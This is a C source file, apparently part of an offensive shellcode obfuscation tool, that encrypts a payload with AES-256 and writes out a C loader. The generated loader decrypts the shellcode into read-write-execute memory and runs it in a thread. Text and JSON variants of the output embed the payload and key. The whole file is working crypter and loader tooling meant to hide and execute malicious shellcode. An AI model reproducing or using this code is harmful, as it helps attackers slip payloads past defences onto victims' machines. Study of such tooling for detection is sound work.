#include "aesfuscation.h"
#include "Common.h"
#include <stdio.h>
#include <string.h>
#include <openssl/evp.h>
#include <openssl/rand.h>

static void write_byte_array(FILE *f, const unsigned char *data, size_t len) {
    for (size_t i = 0; i < len; i++) {
        fprintf(f, "0x%02x", data[i]);
        if (i + 1 < len) {
            fprintf(f, ", ");
        }
        if ((i + 1) % 16 == 0) {
            fprintf(f, "\n    ");
        }
    }
}

bool generate_aes256_output(const char* output_file, const unsigned char* key, size_t key_len) {
    if (!write_shellcode_file(output_file)) {
        return false;
    }
    FILE *f = g_payload.output_file;

    unsigned char iv[16];
    if (!RAND_bytes(iv, sizeof(iv))) {
        printf("[!] Failed to generate random IV\n");
        fclose(f);
        return false;
    }

    unsigned char derived_key[32];
    unsigned char salt[8] = {0};
    int key_bits = EVP_BytesToKey(EVP_aes_256_cbc(), EVP_md5(), salt,
                                   key, key_len, 1, derived_key, NULL);
    if (key_bits <= 0) {
        printf("[!] Failed to derive key\n");
        fclose(f);
        return false;
    }

    fprintf(f, "#include <stdio.h>\n");
    fprintf(f, "#include <stdlib.h>\n");
    fprintf(f, "#include <string.h>\n");
    fprintf(f, "#include <sys/mman.h>\n");
    fprintf(f, "#include <unistd.h>\n");
    fprintf(f, "#include <pthread.h>\n");
    fprintf(f, "#include <openssl/evp.h>\n\n");

    fprintf(f, "unsigned char key[] = {\n    ");
    write_byte_array(f, derived_key, 32);
    fprintf(f, "\n};\n");
    fprintf(f, "#define KEY_LEN 32\n");

    fprintf(f, "unsigned char iv[] = {\n    ");
    write_byte_array(f, iv, 16);
    fprintf(f, "\n};\n");
    fprintf(f, "#define IV_LEN 16\n");

    fprintf(f, "#define SHELLCODE_SIZE %zu\n\n", g_payload.final_size);

    fprintf(f, "unsigned char buf[SHELLCODE_SIZE] = {\n    ");
    write_byte_array(f, g_payload.p_new_shell, g_payload.final_size);
    fprintf(f, "\n};\n\n");

    fprintf(f, "int aes256_decrypt(unsigned char *ciphertext, int clen,\n");
    fprintf(f, "                    unsigned char *key, unsigned char *iv,\n");
    fprintf(f, "                    unsigned char *plaintext) {\n");
    fprintf(f, "    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();\n");
    fprintf(f, "    int len = 0, plen = 0;\n");
    fprintf(f, "    \n");
    fprintf(f, "    if (!EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv)) {\n");
    fprintf(f, "        EVP_CIPHER_CTX_free(ctx);\n");
    fprintf(f, "        return -1;\n");
    fprintf(f, "    }\n");
    fprintf(f, "    \n");
    fprintf(f, "    if (!EVP_DecryptUpdate(ctx, plaintext, &len, ciphertext, clen)) {\n");
    fprintf(f, "        EVP_CIPHER_CTX_free(ctx);\n");
    fprintf(f, "        return -1;\n");
    fprintf(f, "    }\n");
    fprintf(f, "    plen = len;\n");
    fprintf(f, "    \n");
    fprintf(f, "    if (!EVP_DecryptFinal_ex(ctx, plaintext + len, &len)) {\n");
    fprintf(f, "        EVP_CIPHER_CTX_free(ctx);\n");
    fprintf(f, "        return -1;\n");
    fprintf(f, "    }\n");
    fprintf(f, "    plen += len;\n");
    fprintf(f, "    \n");
    fprintf(f, "    EVP_CIPHER_CTX_free(ctx);\n");
    fprintf(f, "    return plen;\n");
    fprintf(f, "}\n\n");

    fprintf(f, "int main() {\n");
    fprintf(f, "    unsigned char shellcode[SHELLCODE_SIZE];\n");
    fprintf(f, "    int decrypted_len = aes256_decrypt(buf, SHELLCODE_SIZE, key, iv, shellcode);\n");
    fprintf(f, "    \n");
    fprintf(f, "    if (decrypted_len <= 0) {\n");
    fprintf(f, "        printf(\"[!] AES256 decryption failed\\n\");\n");
    fprintf(f, "        return -1;\n");
    fprintf(f, "    }\n");
    fprintf(f, "    \n");
    fprintf(f, "    void* exec_mem = mmap(NULL, decrypted_len, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);\n");
    fprintf(f, "    if (exec_mem == MAP_FAILED) { perror(\"mmap failed\"); return -1; }\n");
    fprintf(f, "    memcpy(exec_mem, shellcode, decrypted_len);\n");
    fprintf(f, "    pthread_t t; pthread_create(&t, NULL, (void*(*)(void*))exec_mem, NULL);\n");
    fprintf(f, "    printf(\"[+] AES256 Shellcode decrypted and executed\\n\"); getchar();\n");
    fprintf(f, "    return 0;\n");
    fprintf(f, "}\n");

    fclose(f);
    printf("[+] AES256 output written to %s\n", output_file);
    return true;
}

bool generate_aes256_text_output(const char* output_file, const unsigned char* key, size_t key_len) {
    if (!write_shellcode_file(output_file)) {
        return false;
    }
    FILE *f = g_payload.output_file;

    fprintf(f, "/* AES256 Encrypted Shellcode */\n");
    fprintf(f, "/* Key: ");
    for (size_t i = 0; i < key_len; i++) {
        fprintf(f, "%02x", key[i]);
        if (i + 1 < key_len) fprintf(f, ":");
    }
    fprintf(f, " */\n");
    fprintf(f, "unsigned char shellcode[] = {\n    ");
    write_byte_array(f, g_payload.p_new_shell, g_payload.final_size);
    fprintf(f, "\n};\n");
    fclose(f);
    printf("[+] AES256 text output written to %s\n", output_file);
    return true;
}

bool generate_aes256_json_output(const char* output_file, const unsigned char* key, size_t key_len) {
    if (!write_shellcode_file(output_file)) {
        return false;
    }
    FILE *f = g_payload.output_file;

    fprintf(f, "{\n");
    fprintf(f, "  \"type\": \"AES256\",\n");
    fprintf(f, "  \"key\": \"");
    for (size_t i = 0; i < key_len; i++) {
        fprintf(f, "%02x", key[i]);
    }
    fprintf(f, "\",\n");
    fprintf(f, "  \"shellcode\": [\n    ");
    write_byte_array(f, g_payload.p_new_shell, g_payload.final_size);
    fprintf(f, "\n  ]\n");
    fprintf(f, "}\n");

    fclose(f);
    printf("[+] AES256 json output written to %s\n", output_file);
    return true;
}
